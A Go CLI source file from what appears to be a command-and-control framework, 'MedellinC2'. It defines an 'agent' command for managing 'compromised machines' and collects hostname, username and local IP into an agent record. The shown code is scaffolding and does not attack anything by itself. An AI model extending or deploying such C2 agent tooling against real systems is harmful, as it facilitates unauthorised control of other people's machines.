/*
Copyright © 2022 NAME HERE <EMAIL ADDRESS>

*/
package cmd

import (
	"fmt"
	"net"
	"os"
	"os/user"

	"github.com/google/uuid"
	"github.com/megatop1/MedellinC2/data"
	"github.com/spf13/cobra"
)

// agentCmd represents the agent command
var agentCmd = &cobra.Command{
	Use:   "agent",
	Short: "Interact with agents",
	Long: `Agents are compromised machines that have an established callback to the C2 server. Use the various agents commands to interact with your agents, and run commands. 
	You are in charge of your "houses" in your city of medellin!
	`,
}

func GetHostIP() (hostIP net.IP) {
	conn, err := net.Dial("udp", "172.23.252.10:80")
	if err != nil {
		os.Exit(1)
	}
	defer conn.Close()

	// We only want the IP, not "IP:port"
	hostIP = conn.LocalAddr().(*net.UDPAddr).IP

	return
}

func getAgentInfo() {
	//get the hostname
	hostname, err := os.Hostname()
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
	fmt.Printf("Hostname: %s", hostname)
	print("\n")

	//get the user
	user, err := user.Current()
	if err != nil {
		panic(err)
	}
	fmt.Printf("Username: %s", user.Username)
	print("\n")

	//generate UUID
	//Code to randomly generate UUID
	id := uuid.New().String()
	print("UUID: ")
	fmt.Print(id)
	print("\n")

	//get the IP
	ipResult := GetHostIP().String()
	print("IP Address: " + ipResult)

	generateAgent(id, ipResult, hostname)
}

func generateAgent(UUID, RemoteIP string, Hostname string) {
	data.InsertAgent(UUID, RemoteIP, Hostname)
}

//agent in the background
func agentForeground() {

}

func init() {
	rootCmd.AddCommand(agentCmd)
}
